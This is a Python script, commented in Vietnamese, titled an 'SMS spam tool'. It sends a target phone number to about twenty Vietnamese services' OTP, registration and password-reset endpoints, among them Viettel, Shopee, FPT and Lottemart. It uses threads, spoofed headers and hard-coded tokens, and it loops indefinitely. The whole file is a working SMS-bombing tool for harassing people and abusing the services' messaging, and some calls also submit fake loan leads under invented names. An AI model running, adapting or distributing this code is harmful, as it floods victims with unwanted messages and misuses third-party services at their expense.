import sys
import time
import random
import string
import threading
import requests
import json
from threading import BoundedSemaphore
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Cấu hình threading
MAX_THREADS = 18
semaphore = BoundedSemaphore(MAX_THREADS)

# Danh sách tên ngẫu nhiên
last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng']
middle_names = ['Vân', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']

def generate_random_name():
    last_name = random.choice(last_names)
    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''
    first_name = random.choice(first_names)
    return f"{last_name} {middle_name} {first_name}".strip()

def generate_random_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

def format_device_id(device_id):
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

# Tạo ID ngẫu nhiên cho toàn bộ session
random_id = generate_random_id()
formatted_device_id = format_device_id(random_id)

# ===================== CÁC HÀM GỬI OTP =====================

def send_otp_via_sapo(sdt):
    try:
        cookies = {'landing_page': 'https://www.sapo.vn/', 'lang': 'vi'}
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        data = {'phonenumber': sdt}
        response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data, timeout=10)
        print(f"[SAPO] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[SAPO] Error: {e}")

def send_otp_via_viettel(sdt):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json;charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'phone': sdt, 'typeCode': 'DI_DONG', 'type': 'otp_login'}
        response = requests.post('https://viettel.vn/api/getOTPLoginCommon', headers=headers, json=json_data, timeout=10)
        print(f"[VIETTEL] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[VIETTEL] Error: {e}")

def send_otp_via_medicare(sdt):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        }
        json_data = {'mobile': sdt, 'mobile_country_prefix': '84'}
        response = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data, timeout=10)
        print(f"[MEDICARE] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[MEDICARE] Error: {e}")

def send_otp_via_tv360(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'msisdn': sdt}
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', headers=headers, json=json_data, timeout=10)
        print(f"[TV360] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[TV360] Error: {e}")

def send_otp_via_dienmayxanh(sdt):
    try:
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        response = requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', headers=headers, data=data, timeout=10)
        print(f"[DIENMAYXANH] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[DIENMAYXANH] Error: {e}")

def send_otp_via_kingfoodmart(sdt):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'domain': 'kingfoodmart',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        }
        json_data = {
            'operationName': 'SendOtp',
            'variables': {'input': {'phone': sdt}},
            'query': 'mutation SendOtp($input: SendOtpInput!) { sendOtp(input: $input) { otpTrackingId __typename }}',
        }
        response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data, timeout=10)
        print(f"[KINGFOODMART] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[KINGFOODMART] Error: {e}")

def send_otp_via_mocha(sdt):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        }
        params = {'msisdn': sdt, 'languageCode': 'vi'}
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers, timeout=10)
        print(f"[MOCHA] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[MOCHA] Error: {e}")

def send_otp_via_fptdk(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json; charset=UTF-8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'phone': sdt, 'country_code': 'VN', 'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8'}
        response = requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp', headers=headers, json=json_data, timeout=10)
        print(f"[FPT DK] OTP sent successfully")
    except Exception as e:
        print(f"[FPT DK] Error: {e}")

def send_otp_via_fptmk(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json; charset=UTF-8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'phone': sdt, 'country_code': 'VN', 'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8'}
        response = requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp', headers=headers, json=json_data, timeout=10)
        print(f"[FPT MK] OTP sent successfully")
    except Exception as e:
        print(f"[FPT MK] Error: {e}")

def send_otp_via_VIEON(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'username': sdt, 'country_code': 'VN', 'device_id': 'f812a55d1d5ee2b87a927833df2608bc'}
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', headers=headers, json=json_data, timeout=10)
        print(f"[VIEON] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[VIEON] Error: {e}")

def send_otp_via_ghn(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'phone': sdt, 'type': 'register'}
        response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data, timeout=10)
        print(f"[GHN] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[GHN] Error: {e}")

def send_otp_via_lottemart(sdt):
    try:
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'username': sdt, 'case': 'register'}
        response = requests.post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', headers=headers, json=json_data, timeout=10)
        print(f"[LOTTEMART] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[LOTTEMART] Error: {e}")

def send_otp_via_DONGCRE(sdt):
    try:
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json; charset=utf-8',
            'site-id': '3',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'login': sdt, 'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2'}
        response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data, timeout=10)
        print(f"[DONGCRE] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[DONGCRE] Error: {e}")

def send_otp_via_shopee(sdt):
    try:
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
            'x-api-source': 'pc',
        }
        json_data = {'operation': 8, 'phone': sdt, 'supported_channels': [1, 2, 3, 6, 0, 5], 'support_session': True}
        response = requests.post('https://shopee.vn/api/v4/otp/get_settings_v2', headers=headers, json=json_data, timeout=10)
        print(f"[SHOPEE] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[SHOPEE] Error: {e}")

def send_otp_via_TGDD(sdt):
    try:
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        response = requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', headers=headers, data=data, timeout=10)
        print(f"[TGDD] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[TGDD] Error: {e}")

def send_otp_via_fptshop(sdt):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {'fromSys': 'WEBKHICT', 'otpType': '0', 'phoneNumber': sdt}
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data, timeout=10)
        print(f"[FPTSHOP] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[FPTSHOP] Error: {e}")

def send_otp_via_WinMart(sdt):
    try:
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
            'x-api-merchant': 'WCM',
        }
        json_data = {'firstName': 'Nguyễn Quang Ngọc', 'phoneNumber': sdt, 'gender': 'Male'}
        response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data, timeout=10)
        print(f"[WINMART] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[WINMART] Error: {e}")

def send_otp_via_vietloan(sdt):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        data = {'phone': sdt, '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi'}
        response = requests.post('https://vietloan.vn/register/phone-resend', headers=headers, data=data, timeout=10)
        print(f"[VIETLOAN] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[VIETLOAN] Error: {e}")

def send_otp_via_lozi(sdt):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
            'x-city-id': '50',
        }
        json_data = {'countryCode': '84', 'phoneNumber': sdt}
        response = requests.post('https://mocha.lozi.vn/v1/invites/use-app', headers=headers, json=json_data, timeout=10)
        print(f"[LOZI] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[LOZI] Error: {e}")

def send_otp_via_F88(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }
        json_data = {
            'FullName': generate_random_name(),
            'Phone': sdt,
            'DistrictCode': '024',
            'ProvinceCode': '02',
            'AssetType': 'Car',
            'IsChoose': '1',
        }
        response = requests.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', headers=headers, json=json_data, timeout=10)
        print(f"[F88] Response: {response.text[:100]}")
    except Exception as e:
        print(f"[F88] Error: {e}")

# ===================== DICTIONARY CHỨA TẤT CẢ HÀM =====================
OTP_FUNCTIONS = {
    'sapo': send_otp_via_sapo,
    'viettel': send_otp_via_viettel,
    'medicare': send_otp_via_medicare,
    'tv360': send_otp_via_tv360,
    'dienmayxanh': send_otp_via_dienmayxanh,
    'kingfoodmart': send_otp_via_kingfoodmart,
    'mocha': send_otp_via_mocha,
    'fptdk': send_otp_via_fptdk,
    'fptmk': send_otp_via_fptmk,
    'vieon': send_otp_via_VIEON,
    'ghn': send_otp_via_ghn,
    'lottemart': send_otp_via_lottemart,
    'dongcre': send_otp_via_DONGCRE,
    'shopee': send_otp_via_shopee,
    'tgdd': send_otp_via_TGDD,
    'fptshop': send_otp_via_fptshop,
    'winmart': send_otp_via_WinMart,
    'vietloan': send_otp_via_vietloan,
    'lozi': send_otp_via_lozi,
    'f88': send_otp_via_F88,
}

# ===================== HÀM THỰC THI TRONG LUỒNG =====================
def execute_otp_function(func_name, phone_number):
    with semaphore:
        if func_name in OTP_FUNCTIONS:
            print(f"[{func_name.upper()}] Sending OTP to {phone_number}")
            OTP_FUNCTIONS[func_name](phone_number)
        else:
            print(f"[ERROR] Function {func_name} not found")

def spam_otp(phone_number):
    threads = []
    
    # Chạy tất cả các hàm trong dictionary
    for func_name in OTP_FUNCTIONS.keys():
        thread = threading.Thread(target=execute_otp_function, args=(func_name, phone_number))
        threads.append(thread)
        thread.start()
        # Thêm độ trễ nhỏ giữa các thread để tránh overload
        time.sleep(0.1)
    
    # Chờ tất cả threads hoàn thành
    for thread in threads:
        thread.join()

# ===================== MAIN EXECUTION =====================
def main():
    # Kiểm tra tham số dòng lệnh
    if len(sys.argv) < 2:
        print("Usage: python spamsms.py <phone_number1> <phone_number2> ...")
        print("Example: python spamsms.py 0912345678 0923456789")
        sys.exit(1)
    
    phone_numbers = sys.argv[1:]  # Lấy tất cả số điện thoại từ command line
    
    print("=" * 60)
    print("SMS SPAM TOOL - INFINITE MODE")
    print("=" * 60)
    print(f"Target phone numbers: {', '.join(phone_numbers)}")
    print(f"Total OTP functions: {len(OTP_FUNCTIONS)}")
    print("Press Ctrl+C to stop")
    print("=" * 60)
    
    # Chạy vô hạn
    iteration = 1
    while True:
        try:
            print(f"\n{'='*60}")
            print(f"ITERATION {iteration} - {time.strftime('%Y-%m-%d %H:%M:%S')}")
            print('='*60)
            
            for phone in phone_numbers:
                print(f"\n📱 Spamming phone: {phone}")
                spam_otp(phone)
                # Đợi giữa các số điện thoại
                time.sleep(2)
            
            print(f"\n✅ Iteration {iteration} completed. Waiting 5 seconds before next iteration...")
            iteration += 1
            time.sleep(5)
            
        except KeyboardInterrupt:
            print("\n\n⚠️ Script stopped by user")
            break
        except Exception as e:
            print(f"\n❌ Unexpected error: {e}")
            print("Continuing after 10 seconds...")
            time.sleep(10)

if __name__ == "__main__":
    main()